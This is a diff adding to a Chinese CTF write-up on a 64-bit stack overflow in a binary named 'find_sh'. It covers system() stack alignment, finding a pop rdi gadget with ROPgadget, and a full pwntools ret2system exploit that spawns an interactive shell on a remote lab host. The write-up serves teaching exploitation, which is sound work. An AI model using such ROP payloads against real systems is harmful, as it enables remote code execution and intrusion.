@@ -120,6 +120,55 @@ rbp-rsi之间就是buf中能够输入数据的长度，也是填充数据的长�
 
 易忽略的点：**64位程序中的system函数的栈对齐问题**
 
-1、将system函数地址+1，此处的+1，即是把地址+1，也可以理解为
+1、将system函数地址+1，此处的+1，即是把地址+1，也可以理解为<br>
+![image](https://github.com/xhsy0314/Task/assets/84487619/eb180202-e2d8-487b-9baf-750facc25279)<br>
+本来我们应该是用401186这个地址的，但是我们现在要跳过一条指令，那自然就是用401187，这样就跳过了push rbp这条指令。
+2、直接在调用system函数地址之前去调用一个ret指令。因为本来现在是没有对齐的，那我现在直接执行一条对栈操作指令（ret指令等同于pop rip，该指令使得rsp+8，从而完成rsp16字节对齐），这样system地址所在的栈地址就是0结尾，从而完成了栈对齐。<br>
+![image](https://github.com/xhsy0314/Task/assets/84487619/d13b7ae2-28d0-452d-a88e-f83db2e3e31c)<br>
+
+
+因此payload：
+
+```
+payload = b'a' * offset # 溢出大小
+payload += p64(ret) # ret地址
+payload += p64(pop rdi) # pop rdi地址
+payload += p64(binsh) # /bin/sh字符串地址
+payload += p64(sys) # _system函数地址
+```
+
+其中ret地址就是上图中的0x401198.<br>
+pop rdi：
+```
+ROPgadget --binary find_sh --only 'pop|ret' | grep 'rdi' 
+```
+![image](https://github.com/xhsy0314/Task/assets/84487619/e8b3f0a0-9b54-4d6f-9341-a4490d350efd)<br>
+
+binsh:<br>
+![image](https://github.com/xhsy0314/Task/assets/84487619/9a492389-2b47-49b4-a542-93f3e9e6a615)
+<br>
+
+system:<br>
+![image](https://github.com/xhsy0314/Task/assets/84487619/9af975e0-7e9f-4da9-8083-81dcd2d039ca)<br>
+
+完整exp：
+
+```
+from pwn import *
+							
+#p=process("./stack_overflow")
+io=remote("10.140.32.159",48126)
+
+binsh=0x404040
+sys=0x401070
+ret=0x401198
+poprdi=0x0000000000401253
+#p64(0x0000000000401198) +
+payload= b'A'*8 +b'B'*8 +p64(ret)+p64(poprdi)+p64(0x404040)+ p64(sys)
+
+io.sendline(payload)
+io.interactive()
+```
+
 
 
